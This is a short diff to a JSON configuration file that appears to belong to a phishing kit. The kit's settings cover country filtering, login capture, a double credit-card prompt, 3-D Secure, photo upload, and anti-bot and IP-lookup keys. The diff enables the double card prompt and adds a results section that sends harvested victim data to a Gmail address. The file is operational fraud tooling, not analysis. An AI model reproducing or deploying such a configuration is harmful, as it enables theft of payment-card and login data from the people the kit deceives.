@@ -6,11 +6,11 @@
         "allow_country": "AF"
     },
     "sp": {
-        "param": "plms",
+        "param": "sgma",
         "case": "locked",
         "one_time": "1",
         "send_login": "1",
-        "double_cc": "0",
+        "double_cc": "1",
         "3dsecure": "0",
         "email_login": "0",
         "photo": "1",
@@ -28,5 +28,11 @@
     "apikey": {
         "antibot": "",
         "ipstack": ""
+    },	
+    
+    "result":{
+    "result_telegram": "this feature is unavailable for security reason",
+    "result_email": "kantorpakpos@gmail.com"
     }
+
 }
